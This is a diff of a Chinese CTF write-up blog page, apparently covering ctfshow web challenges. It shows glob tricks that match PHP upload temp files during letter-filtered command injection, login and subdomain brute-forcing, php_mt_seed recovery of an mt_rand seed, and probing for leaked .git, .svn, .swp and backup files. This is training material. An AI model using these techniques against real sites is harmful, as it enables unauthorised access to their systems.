+<p>当我们post上传一个文件后，此时<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=PHP&spm=1001.2101.3001.7020">PHP</a>会将我们上传的文件保存在临时文件夹下，==默认的文件名是<code>/tmp/phpXXXXXX=</code>==，文件名最后6个字符是随机生成的大小写字母。想当然的我们会用<code>/???/?????????</code>去匹配这个文件。<br>这里又会出现一个问题：符合这样的文件有好几个，这样其实匹配不到刚刚上传的文件</p>
+<p>这时候就需要我们对通配符的深刻理解了</p>
+<p>首先</p>
+<p>1、glob支持利用[0-9]来表示一个范围，所以我们可以用[A-Z]来匹配文件的最后一位，但因为过滤了字母，需要把A改为A的前一位<code>@</code>，把Z改为Z的后一位<code>[</code>来匹配大写字母。</p>
+<p>2、glob支持用<code>[^x]</code>的方法来构造“这个位置不是字符x”。那么，我们用这个姿势干掉<code>/bin/run-parts</code>：（这题用不到）</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/media/attachment/2018/10/06/0a5b0800-1a01-4738-831f-f597795255e0.png"><img src="%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/0a5b0800-1a01-4738-831f-f597795255e0.63b17aebf66d.png" alt="image.png"></a></p>
+<p><em>这里说下为什么要匹配大写字母，因为其实用<code>/???/?????????</code>匹配到的其他文件都是小写字母，只有php临时生成的文件才包含大写字母，不过因为是随机生成的大写字母，不一定每次都是大写，</em></p>
+<img src="/2022/02/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20220308233356915.png" class="" title="image-20220308233356915">
+
+<p>参考连接</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇 | 离别歌 (leavesongs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hello-py/articles/13646033.html">无字母数字的命令执行(ctfshow web入门 55） - Firebasky - 博客园 (cnblogs.com)</a></p>
+<p>)</p>
+<h4 id="56用55的第三种"><a href="#56用55的第三种" class="headerlink" title="56用55的第三种"></a>56用55的第三种</h4>
       
     </div>
 
@@ -1684,303 +1953,11 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/22/%E2%80%9Cweb%E7%88%86%E7%A0%B4%E9%A2%98%E2%80%9D/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/02/22/%E2%80%9Cweb%E7%88%86%E7%A0%B4%E9%A2%98%E2%80%9D/" class="post-title-link" itemprop="url">“web爆破题”</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-02-22 12:11:19" itemprop="dateCreated datePublished" datetime="2022-02-22T12:11:19+08:00">2022-02-22</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-02-23 13:47:46" itemprop="dateModified" datetime="2022-02-23T13:47:46+08:00">2022-02-23</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="web21-简单爆破题目"><a href="#web21-简单爆破题目" class="headerlink" title="web21 简单爆破题目"></a>web21 简单爆破题目</h3><p>1、打开题目发现有登入页面，随便输入利用burpsuit抓包</p>
-<img src="/2022/02/22/%E2%80%9Cweb%E7%88%86%E7%A0%B4%E9%A2%98%E2%80%9D/image-20220215232138761-16455952610621.png" class="" title="image-20220215232138761">
-
-<p>2、</p>
-<img src="/2022/02/22/%E2%80%9Cweb%E7%88%86%E7%A0%B4%E9%A2%98%E2%80%9D/image-20220215232234001-16455952610632.png" class="" title="image-20220215232234001">
-
-<p>3、<strong>开始进行爆破</strong></p>
-<img src="/2022/02/22/%E2%80%9Cweb%E7%88%86%E7%A0%B4%E9%A2%98%E2%80%9D/image-20220216101318948-16455952610633.png" class="" title="image-20220216101318948">
-
-<img src="/2022/02/22/%E2%80%9Cweb%E7%88%86%E7%A0%B4%E9%A2%98%E2%80%9D/image-20220216105533915-16455952610634.png" class="" title="image-20220216105533915">
-
-<img src="/2022/02/22/%E2%80%9Cweb%E7%88%86%E7%A0%B4%E9%A2%98%E2%80%9D/image-20220216110919730-16455952610645.png" class="" title="image-20220216110919730">
-
-
-
-<h3 id="wweb22子域名爆破"><a href="#wweb22子域名爆破" class="headerlink" title="wweb22子域名爆破"></a>wweb22子域名爆破</h3><p>1、根据题目提示，利用在线子域名爆破工具</p>
-<img src="/2022/02/22/%E2%80%9Cweb%E7%88%86%E7%A0%B4%E9%A2%98%E2%80%9D/image-20220216111442818-16455952610646.png" class="" title="image-20220216111442818">
-
-<p>2、查到这些域名<img src="/2022/02/22/%E2%80%9Cweb%E7%88%86%E7%A0%B4%E9%A2%98%E2%80%9D/image-20220216111755875-16455952610647.png" class="" title="image-20220216111755875"></p>
-<p>3、将光标放到标签就可以看到</p>
-<img src="/2022/02/22/%E2%80%9Cweb%E7%88%86%E7%A0%B4%E9%A2%98%E2%80%9D/image-20220216111848270-16455952610648.png" class="" title="image-20220216111848270">
-
-
-
-<h3 id="web23脚本"><a href="#web23脚本" class="headerlink" title="web23脚本"></a>web23脚本</h3><p>1、分析代码</p>
-<img src="/2022/02/22/%E2%80%9Cweb%E7%88%86%E7%A0%B4%E9%A2%98%E2%80%9D/image-20220216121245382-16455952610649.png" class="" title="image-20220216121245382">
-
-<p>2、利用在线工具写一个简单的php脚本</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">1000</span>;<span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$token</span>=md5(<span class="variable">$i</span>);</span><br><span class="line">	<span class="keyword">if</span>(substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))</span><br><span class="line">	&#123; <span class="keyword">if</span>((intval(substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+intval(substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===intval(substr(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))</span><br><span class="line">	    &#123;  <span class="keyword">echo</span><span class="string">&#x27;token=&#x27;</span>.<span class="variable">$i</span>.<span class="string">&#x27;md5=&#x27;</span>.<span class="variable">$token</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<img src="/2022/02/22/%E2%80%9Cweb%E7%88%86%E7%A0%B4%E9%A2%98%E2%80%9D/image-20220216124425154-164559526106410.png" class="" title="image-20220216124425154">
-
-
-
-<h3 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h3><p>1、</p>
-<img src="/2022/02/22/%E2%80%9Cweb%E7%88%86%E7%A0%B4%E9%A2%98%E2%80%9D/image-20220216222924227-164559526106411.png" class="" title="image-20220216222924227">
-
-<p>2、写php代码</p>
-<img src="/2022/02/22/%E2%80%9Cweb%E7%88%86%E7%A0%B4%E9%A2%98%E2%80%9D/image-20220216223056921-164559526106412.png" class="" title="image-20220216223056921">
-
-<p>3、传参</p>
-<h3 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h3><p>1、分析代码</p>
-<img src="/2022/02/22/%E2%80%9Cweb%E7%88%86%E7%A0%B4%E9%A2%98%E2%80%9D/image-20220216230633443-164559526106413.png" class="" title="image-20220216230633443">
-
-<p>2、关键点</p>
-<img src="/2022/02/22/%E2%80%9Cweb%E7%88%86%E7%A0%B4%E9%A2%98%E2%80%9D/image-20220216230752637-164559526106414.png" class="" title="image-20220216230752637">
-
-<img src="/2022/02/22/%E2%80%9Cweb%E7%88%86%E7%A0%B4%E9%A2%98%E2%80%9D/image-20220216231535774-164559526106415.png" class="" title="image-20220216231535774">
-
-
-
-
-
-
-
-<p>3、**==考点；这里我们需要根据得到的第一个随机数推导出他的种子seed==**</p>
-<p><strong>在这里我们需要用到一个工具：<code>php_mt_seed</code> 官网下载地址：<a target="_blank" rel="noopener" href="https://www.openwall.com/php_mt_seed/">https://www.openwall.com/php_mt_seed/</a></strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd php_mt_seed-<span class="number">4.0</span>   进入到目录下</span><br><span class="line">   </span><br><span class="line">make            安装，不然后面的命令执行不了</span><br><span class="line">time ./php_mt_seed <span class="number">1937331282</span>   执行</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<img src="/2022/02/22/%E2%80%9Cweb%E7%88%86%E7%A0%B4%E9%A2%98%E2%80%9D/image-20220216233250673-164559526106516.png" class="" title="image-20220216233250673">
-
-<p>4、</p>
-<p>写php代码</p>
-<img src="/2022/02/22/%E2%80%9Cweb%E7%88%86%E7%A0%B4%E9%A2%98%E2%80%9D/image-20220216234711030-164559526106517.png" class="" title="image-20220216234711030">
-
-
-
-<p>5、<img src="/2022/02/22/%E2%80%9Cweb%E7%88%86%E7%A0%B4%E9%A2%98%E2%80%9D/%E4%B8%8B%E8%BD%BD-164559526106518.png" class="" title="下载"></p>
-<h3 id="web26-可以爆破也可以看代码"><a href="#web26-可以爆破也可以看代码" class="headerlink" title="web26  可以爆破也可以看代码"></a>web26  可以爆破也可以看代码</h3><p>我的做法：不知道因为是做过了原因还是题目问题，我发现在登入页面直接点安装，发现连接数据库成功，所以我就抓个包，然后重发就得到了flag</p>
-<p>参考做法：对密码进行爆破</p>
-<p>1、</p>
-<h3 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h3><p>1、</p>
-<img src="/2022/02/22/%E2%80%9Cweb%E7%88%86%E7%A0%B4%E9%A2%98%E2%80%9D/image-20220217093137640-164559526106519.png" class="" title="image-20220217093137640">
-
-<p>2、进行对生日爆破</p>
-<img src="/2022/02/22/%E2%80%9Cweb%E7%88%86%E7%A0%B4%E9%A2%98%E2%80%9D/image-20220217093826577-164559526106520.png" class="" title="image-20220217093826577">
-
-<img src="/2022/02/22/%E2%80%9Cweb%E7%88%86%E7%A0%B4%E9%A2%98%E2%80%9D/image-20220217113306275-164559526106521.png" class="" title="image-20220217113306275">
-
-<p><strong>注意：爆破时线程开低点</strong></p>
-<img src="/2022/02/22/%E2%80%9Cweb%E7%88%86%E7%A0%B4%E9%A2%98%E2%80%9D/image-20220217113657092-164559526106522.png" class="" title="image-20220217113657092">
-
-
-
-<h3 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h3>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/21/web%E5%85%A5%E9%97%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/01/21/web%E5%85%A5%E9%97%A8/" class="post-title-link" itemprop="url">web入门</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-01-21 20:46:31" itemprop="dateCreated datePublished" datetime="2022-01-21T20:46:31+08:00">2022-01-21</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-01-22 13:46:27" itemprop="dateModified" datetime="2022-01-22T13:46:27+08:00">2022-01-22</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h4 id="web入门2"><a href="#web入门2" class="headerlink" title="web入门2"></a>web入门2</h4><p>因为提示看不了源码（右键和F12都看不了），然后试着用burpsuit抓包一下，就可以了</p>
-<p>其他方法：1、换协议：URL中直接加入view-source:</p>
-<p>​                    2、直接利用开发者工具也可以</p>
-<p>​                     3.在开发者工具中利用network</p>
-<h4 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h4><p>熟悉的抓包就可以了</p>
-<h4 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h4><p>看了提示robots，做过类似的题，robots是机器人协议</p>
-<p>直接看robots.txt，然后发现有一个flagishere.txt文件不允许访问</p>
-<h4 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h4><p>题目提示是phps源码泄露，我好像之前做过类似的php 和phps题目</p>
-<p>然后试着在URL中输入index.php中发现会有一个下载文件</p>
-<h4 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h4><p>这题刚看到提示的时候试着用御剑扫描，不知道是我用的字典问题还是什么，什么都没扫出来</p>
-<p>然后看到了教程，说可以用dirsearch扫描或者直接在URL后加<a target="_blank" rel="noopener" href="http://www.zip(这里我也不知道为什么,查了资料也没有说的)/">www.zip（这里我也不知道为什么，查了资料也没有说的）</a></p>
-<p>然后会下载zip，有两个文件，index.php提示在fl000g.txt里，但是直接访问是不可以的（因为我们下载的zip是别人修改过的，所以需要我们在网页中查看那个fl000g.txt</p>
-<p>补充知识：<a href="http://www.zip:网站的文件都是放置在www文件夹下面的,WWW文件夹里面的文件全部压缩在[www.zip](http://www.zip)里面了。">www.zip:网站的文件都是放置在www文件夹下面的,WWW文件夹里面的文件全部压缩在[www.zip](http://www.zip)里面了。</a></p>
-<h4 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h4><p>不知道版本控制是什么啊，试着抓了个包，发现什么都没有。</p>
-<p>==补充知识==：</p>
-<p>​               版本控制器泄露有两种：</p>
-<h5 id="一种是git泄露："><a href="#一种是git泄露：" class="headerlink" title="一种是git泄露："></a>一种是git泄露：</h5><p>​                           git文件是开发人员在开发过程中使用 Git(分布式版本控制系统)做开发时产生的隐藏目录，该文件包含一些版本信息和网站源码，数据库信息等敏感信息</p>
-<p> 1、通常开发人员在开发时，通常将源码提交到远程的托管网站（如Github）方便管理与交互，等到开发最后阶段，再将源码从远程服务器上下载到 web 目录下， 如果开发人员忘记将其中的 .git文件删除，则可以通过 .git文件恢复网站源码，来获取一些敏感信息；<br>2、开发人员对站点使用 Git 对版本进行控制，实现自动部署，如果配置不当，直接将 .git文件加载到线上环境，这样便引起了.git文件泄露。</p>
-<h5 id="另外一种是svn"><a href="#另外一种是svn" class="headerlink" title="另外一种是svn"></a>另外一种是svn</h5><p>SVN（subversion）是程序员常用的源代码版本管理软件。在使用 SVN 管理本地代码过程中，使用 svn checkout 功能来更新代码时，项目目录下会自动生成隐藏的<code>.svn</code>文件夹</p>
-<p>==造成SVN源代码漏洞的主要原因==是管理员操作不规范，一些网站管理员在发布代码时，不愿意使用“导出”功能，而是直接复制代码文件夹到WEB服务器上（直接将.svn文件复制到了外网环境），这就使得<code>.svn</code>隐藏文件夹被暴露于外网环境，黑客对此可进一步利用：</p>
-<p>1、在 svn1.6 及以前版本会在项目的每个文件夹下都生成一个.svn文件夹，里面包含了所有文件的备份，文件名为 .svn/text-base/文件名.svn-base ；</p>
-<p>2、在 svn1.7 及以后版本则只在项目根目录生成一个.svn文件夹，里面的pristine文件夹里包含了整个项目的所有文件备份。</p>
-<p>然后直接在URL中输入/.git  就可以了</p>
-<h4 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h4><p>同样的提示，试着/.git 不行，那只能是另外一种了，</p>
-<h4 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h4><p>vim在编辑文档的过程中如果异常退出，会产生缓存文件，第一次产生的缓存文件后缀为.swp，后面会产生swo等.</p>
-<p>文中提示异常退出，所以直接在URL中输入index.php.swp</p>
-<h4 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h4><p>题目提示是cookie，做过类似的题，直接抓包就可以了</p>
-<p>看了答案才发现，抓包的flag经过了URL加密，但是我直接复制未解密的也可以，原来是因为已经做出的题目无论提交什么都是对的。。。。。。。。。。。。。</p>
-<h4 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h4><p>第一次做到有关域名的题，，题目提示ctfshow.com有隐藏信息，直接利用<a target="_blank" rel="noopener" href="https://zijian.aliyun.com/">阿里云网站运维检测平台 (aliyun.com)</a></p>
-<p>解析就可以了</p>
-<h4 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h4><p>属实没想到啊，，看了题目提示，我一直盯着那些货物，没有滑到下面</p>
-<p>查看了官方答案:首先应该查看robots.txt（这是应该解题要做的），发现有一个/admin/，然后在页面下发找到admin的密码</p>
-<h5 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h5><p>这题还是很不理解，难道这些人都那么喜欢吧关键点藏在最后面么？把所有的产品都点过了，就是没点下面的。真可恶啊。</p>
-<img src="/2022/01/21/web%E5%85%A5%E9%97%A8/image-20220120214406106-16427692717891.png" class="" title="image-20220120214406106">
-
-
-
-
-
-
-
-<img src="/2022/01/21/web%E5%85%A5%E9%97%A8/image-20220120214905856-16427693130938.png" class="" title="image-20220120214905856">
-
-
-
-<p>遇到有关页面的题，全部都要点一遍</p>
-<h4 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h4><h5 id="这题的编辑器editor漏洞，一版都是文件上传漏洞"><a href="#这题的编辑器editor漏洞，一版都是文件上传漏洞" class="headerlink" title="这题的编辑器editor漏洞，一版都是文件上传漏洞"></a>这题的编辑器editor漏洞，一版都是文件上传漏洞</h5><p>首先查看源码，查找editor</p>
-<p>发现有</p>
-<img src="/2022/01/21/web%E5%85%A5%E9%97%A8/image-20220121101624595-16427693106507.png" class="" title="image-20220121101624595">
-
-
-
-<p>因为是文件上传漏洞，所以找到文件上传，又因为默认配置的原因，它显示根目录下所有的目录（与linux目录一样），所有一般会将flag藏在（home var，temp，user）等等目录，然后在这些目录下寻找网页文件（html，这是应该要做的）。然后访问就可以了   （这时应该注意文件路径）</p>
-<img src="/2022/01/21/web%E5%85%A5%E9%97%A8/image-20220121102439323-16427693080146.png" class="" title="image-20220121102439323">
-
-
-
-<h4 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h4><p>提示邮箱有问题，注意有两个邮箱，然后尝试访问/admin，真的有，然后把demo当做用户，另外一个邮箱当密码发现不行，最后输入admin发现用户对的，尝试着用字典对密码爆破，发现不行</p>
-<p>查看了答案，</p>
-<p>要利用那个忘记密码，然后去qq查看他的地址</p>
-<h4 id="web16-php探针"><a href="#web16-php探针" class="headerlink" title="web16 php探针"></a>web16 php探针</h4><p>知识盲点：PHP探针</p>
-<p>php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。</p>
-<p>做法：在URL中输入tz.php</p>
-<p>然后开始懵逼</p>
-<h4 id="web17-备份文件backup"><a href="#web17-备份文件backup" class="headerlink" title="web17    备份文件backup"></a>web17    备份文件backup</h4><p>题目提示是sql的备份文件，所以在URL中输入backup.sq</p>
-<h4 id="web18-js代码审计吧"><a href="#web18-js代码审计吧" class="headerlink" title="web18   js代码审计吧"></a>web18   js代码审计吧</h4><p>打开，试玩了一下，果断放弃，，然后通过开发者工具查看源代码，搜一下flag，发现</p>
-<img src="/2022/01/21/web%E5%85%A5%E9%97%A8/image-20220121192314392-16427693002765.png" class="" title="image-20220121192314392">
-
-<img src="/2022/01/21/web%E5%85%A5%E9%97%A8/image-20220121193054894-16427693190359.png" class="" title="image-20220121193054894">
-
-<p>像这种游戏题，一般都是通过查看源代码，然后查看通管条件，以及通关后有什么来解题</p>
-<h4 id="web19-前端"><a href="#web19-前端" class="headerlink" title="web19 前端"></a>web19 前端</h4><p>一般提示到前端，js代码，都要查看源码</p>
-<img src="/2022/01/21/web%E5%85%A5%E9%97%A8/image-20220121193716629-164276932175410.png" class="" title="image-20220121193716629">
-
-<img src="/2022/01/21/web%E5%85%A5%E9%97%A8/image-20220121195139742-164276932419111.png" class="" title="image-20220121195139742">
-
-
-
-
-
-<h4 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h4><p>db目录：作为数据库的存储文件，</p>
-<p>尝试一下db目录下的data.dbd或者mdb.dbd</p>
-<p>下载好后直接用记事本打开搜flag就可以了</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+  </nav>
 
 
 
@@ -2045,7 +2022,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-count">12</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
